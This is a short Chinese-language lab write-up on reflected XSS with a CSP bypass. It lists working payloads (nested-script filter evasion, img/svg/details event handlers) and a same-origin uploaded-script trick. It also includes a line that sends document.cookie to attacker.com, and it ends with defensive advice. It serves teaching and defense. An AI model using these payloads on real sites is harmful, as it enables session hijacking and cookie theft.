# 学习笔记 · XSS 与 CSP 绕过

> 来源：靶场复现 | 难度：⭐⭐⭐ | 考点：`XSS` `CSP` `前端安全`

## 场景

站点输出点做了基础过滤（`<script>` 被替换），且部署了 CSP：

```
Content-Security-Policy: script-src 'self' cdn.example.com; object-src 'none'
```

## 思路链

### 1. 确认输出点与上下文

- 反射点在 HTML body：`?name=xxx`
- 过滤：`<script>` 整体删除（可用嵌套绕过：`<scr<script>ipt>`）
- `img/svg/iframe` 等标签未过滤

### 2. 绕过过滤

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

但 CSP 只允许加载同源脚本，`onerror=eval(...)` 也会被拦？——注意：**内联事件受 CSP 影响，除非有 nonce/hash**。此时需先在同源下找一个「JS 文件可控或可利用」的点。

### 3. 同源脚本利用（CSP: 'self' 的经典绕过）

- 站点存在文件上传，且上传目录在同源下 → 上传 `x.js`：
  ```html
  <script src="/uploads/x.js"></script>
  ```
- `cdn.example.com` 若有开放重定向或存在老版本 angularjs → `?callback=` 劫持

### 4. 打到 Cookie

x.js 内容：
```js
new Image().src = "http://attacker.com/log?c=" + document.cookie;
```

## 防守视角

- CSP 别只用 `'self'`，配合 nonce 严格模式
- 输出编码（按上下文 HTML/JS/URL 分别转义）永远是第一位
- 上传目录与业务隔离域名，杜绝同源执行

## 总结

- XSS 题的三层关卡：**过滤 → 上下文 → CSP**，一层层剥
- CSP 绕过本质是找「策略允许范围内的可执行点」
